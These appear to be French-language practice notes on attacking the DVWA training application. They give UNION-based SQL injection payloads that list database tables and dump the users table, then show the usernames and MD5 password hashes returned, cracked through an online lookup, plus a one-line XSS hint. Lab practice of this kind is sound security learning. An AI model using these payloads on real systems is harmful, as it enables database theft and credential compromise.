Injection SQL ajouter 0' au début d'une requète et -- (avec un espace) à la fin de la requète.
-------------------------------------------------------------------------------------------------------------------------------
1) Voir la liste des tables / colonnes 
0' UNION SELECT 1,concat(TABLE_SCHEMA,char(32),table_name,char(32),COLUMN_NAME,char(32)) FROM information_schema.columns -- 

ID: 0' UNION SELECT 1,concat(TABLE_SCHEMA,char(32),table_name,char(32),COLUMN_NAME,char(32)) FROM information_schema.columns -- 
First name: 1
Surname: dvwa users user

ID: 0' UNION SELECT 1,concat(TABLE_SCHEMA,char(32),table_name,char(32),COLUMN_NAME,char(32)) FROM information_schema.columns -- 
First name: 1
Surname: dvwa users password
-------------------------------------------------------------------------------------------------------------------------------
2) Trouver l'utilisateur / mot de passe
0' UNION SELECT user,password FROM users -- 

ID: 0' UNION SELECT user,password FROM users -- 
First name: admin
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

ID: 0' UNION SELECT user,password FROM users -- 
First name: gordonb
Surname: e99a18c428cb38d5f260853678922e03

ID: 0' UNION SELECT user,password FROM users -- 
First name: 1337
Surname: 8d3533d75ae2c3966d7e0d4fcc69216b

ID: 0' UNION SELECT user,password FROM users -- 
First name: pablo
Surname: 0d107d09f5bbe40cade3de5c71e9e9b7

ID: 0' UNION SELECT user,password FROM users -- 
First name: smithy
Surname: 5f4dcc3b5aa765d61d8327deb882cf99

Mot de pass hashé : https://crackstation.net/

5f4dcc3b5aa765d61d8327deb882cf99    md5 password
e99a18c428cb38d5f260853678922e03    md5 abc123
8d3533d75ae2c3966d7e0d4fcc69216b    md5 charley
0d107d09f5bbe40cade3de5c71e9e9b7    md5 letmein
5f4dcc3b5aa765d61d8327deb882cf99    md5 password
-------------------------------------------------------------------------------------------------------------------------------
XSS
Ajouter des balises <script> dans un champ avec le code voulu